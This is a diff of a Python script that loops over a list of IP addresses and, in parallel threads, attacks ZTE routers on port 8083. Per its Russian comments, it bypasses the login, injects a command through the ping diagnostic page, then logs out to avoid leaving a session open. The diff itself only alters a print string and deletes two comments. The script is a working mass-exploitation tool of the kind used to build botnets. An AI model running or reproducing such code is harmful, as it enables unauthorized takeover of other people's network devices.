@@ -15,12 +15,11 @@ class rtek(threading.Thread):
 
     def run(self):
         try:
-            print("[ZTE] Loading - " + self.ip)
+            print("[ZTE] L0ading - " + self.ip)
             url = "http://" + self.ip + ":8083/login.gch"
             url2 = "http://" + self.ip + ":8083/manager_dev_ping_t.gch"
             url3 = "http://" + self.ip + ":8083/getpage.gch?pid=1001&logout=1"
 
-            # Выполнение запросов
             requests.post(url, timeout=3, data=login_payload)  # обход авторизации
             requests.post(url2, timeout=2.5, data=command_payload)  # внедрение команды в функцию ping
             requests.get(url3, timeout=2.5)  # выход, чтобы не оставлять сессию открытой
@@ -28,7 +27,6 @@ class rtek(threading.Thread):
         except Exception as e:
             pass
 
-# Запуск потоков для каждого IP
 for ip in ips:
     try:
         n = rtek(ip)
